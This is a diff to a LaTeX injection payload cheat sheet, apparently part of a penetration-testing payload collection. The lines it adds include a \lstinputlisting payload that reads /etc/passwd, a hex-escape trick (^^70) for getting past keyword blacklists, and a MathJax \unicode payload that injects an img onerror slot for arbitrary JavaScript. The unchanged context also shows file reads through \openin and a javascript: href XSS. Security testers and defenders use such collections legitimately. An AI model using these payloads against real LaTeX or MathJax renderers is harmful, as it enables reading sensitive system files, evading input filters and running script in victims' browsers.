@@ -1,5 +1,7 @@
 # LaTex Injection
 
+You might need to adjust injection with wrappers as `\[` or `$`.
+
 ## Read file
 
 Read file and interpret the LaTeX code in it:
@@ -22,6 +24,7 @@ Read single lined file:
 Read multiple lined file:
 
 ```tex
+\lstinputlisting{/etc/passwd}
 \newread\file
 \openin\file=/etc/passwd
 \loop\unless\ifeof\file
@@ -48,6 +51,14 @@ characters can be deactivated in order to use `\input` on file containing `$`, `
 \catcode `\_=12
 \catcode `\&=12
 \input{path_to_script.pl}
+```
+
+To bypass a blacklist try to replace one character with it's unicode hex value. 
+- ^^41 represents a capital A
+- ^^7e represents a tilde (~) note that the ‘e’ must be lower case
+
+```tex
+\lstin^^70utlisting{/etc/passwd}
 ```
 
 ## Write file
@@ -93,7 +104,12 @@ From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
 \href{javascript:alert(1)}{placeholder}
 ```
 
-Live example at `http://payontriage.com/xss.php?xss=$\href{javascript:alert(1)}{Frogs%20find%20bugs}$`
+in [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html)
+
+```tex
+\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
+```
+
 
 ## References
 
